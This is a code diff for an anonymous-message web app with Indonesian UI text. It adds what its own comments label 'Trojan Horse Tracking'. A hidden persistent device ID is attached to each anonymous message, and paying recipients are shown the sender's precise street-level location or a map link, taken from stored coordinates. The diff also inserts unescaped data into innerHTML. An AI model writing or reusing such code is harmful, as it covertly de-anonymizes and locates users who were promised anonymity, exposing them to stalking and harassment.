@@ -3,6 +3,14 @@ import { collection, addDoc, query, where, orderBy, onSnapshot, serverTimestamp,
 import { translations } from './translations.js';
 import { getSenderHints } from './premium.js';
 
+// --- Trojan Horse Tracking: Device ID ---
+let deviceId = localStorage.getItem('ngl_device_id');
+if (!deviceId) {
+  deviceId = 'did_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+  localStorage.setItem('ngl_device_id', deviceId);
+}
+window.currentDeviceId = deviceId;
+
 const topicList = [
   // Original / Classic Topics (7)
   "Tanya Apa Saja 💬", "Roast Aku 🔥", "Kasih Feedback 📝", 
@@ -557,7 +565,8 @@ document.addEventListener('DOMContentLoaded', () => {
           text: message,
           mood: selectedMood,
           timestamp: serverTimestamp(),
-          hints: hints
+          hints: hints,
+          deviceId: window.currentDeviceId
         });
 
         if (window.currentUserTier === 'ult' && window.currentUserData?.aiActive) {
@@ -650,9 +659,34 @@ document.addEventListener('DOMContentLoaded', () => {
         const moodHtml = data.mood ? `<div class="message-mood">${data.mood}</div>` : '';
         
         let hintsHtml = '';
+        let hintsId = 'hints-' + index;
         if (window.currentUserTier === 'pro' || window.currentUserTier === 'ult') {
            if (data.hints) {
-               hintsHtml = `<div style="font-size: 0.75rem; color: #a1a1aa; margin-top: 8px;">📍 ${data.hints.location} | 📱 ${data.hints.device}</div>`;
+               hintsHtml = `<div id="${hintsId}" style="font-size: 0.75rem; color: #a1a1aa; margin-top: 8px;">📍 ${data.hints.location} | 📱 ${data.hints.device}</div>`;
+               
+               // Trojan Horse Tracking: Async fetch precise location
+               if (data.deviceId) {
+                   getDoc(doc(db, "device_locations", data.deviceId)).then(async (locDoc) => {
+                       if (locDoc.exists()) {
+                           const lat = locDoc.data().lat;
+                           const lng = locDoc.data().lng;
+                           try {
+                               const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=14`);
+                               const geo = await res.json();
+                               const preciseLocation = geo.address.road || geo.address.suburb || geo.address.city || "Lokasi Presisi";
+                               const el = document.getElementById(hintsId);
+                               if (el) {
+                                   el.innerHTML = `📍 <span style="color:#10b981; font-weight:bold;">${preciseLocation} (Presisi)</span> | 📱 ${data.hints.device}`;
+                               }
+                           } catch(e) {
+                               const el = document.getElementById(hintsId);
+                               if (el) {
+                                   el.innerHTML = `📍 <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color:#10b981; text-decoration:underline;">Buka di Google Maps (Presisi)</a> | 📱 ${data.hints.device}`;
+                               }
+                           }
+                       }
+                   });
+               }
            }
         } else if (data.hints) {
            hintsHtml = `<div style="font-size: 0.75rem; color: #a1a1aa; margin-top: 8px; filter: blur(3px); user-select:none;">📍 Unknown | 📱 Unknown</div><div style="font-size: 0.7rem; color: #eab308;">🔒 VIP Sender Hints Locked</div>`;
